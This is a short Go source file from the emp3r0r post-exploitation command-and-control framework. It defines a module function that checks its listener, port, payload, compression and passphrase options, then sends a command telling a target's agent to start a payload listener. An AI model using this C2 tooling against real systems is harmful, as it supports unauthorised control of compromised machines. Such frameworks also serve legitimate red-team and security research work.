//go:build linux
// +build linux

package cc

import (
	"fmt"

	"github.com/fatih/color"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func modListener() {
	if CurrentModuleOptions["listener"] == nil || CurrentModuleOptions["port"] == nil || CurrentModuleOptions["payload"] == nil || CurrentModuleOptions["compression"] == nil || CurrentModuleOptions["passphrase"] == nil {
		LogError("One or more required options are nil")
		return
	}
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		emp3r0r_def.C2CmdListener,
		CurrentModuleOptions["listener"].Val,
		CurrentModuleOptions["port"].Val,
		CurrentModuleOptions["payload"].Val,
		CurrentModuleOptions["compression"].Val,
		CurrentModuleOptions["passphrase"].Val)
	err := SendCmd(cmd, "", CurrentTarget)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
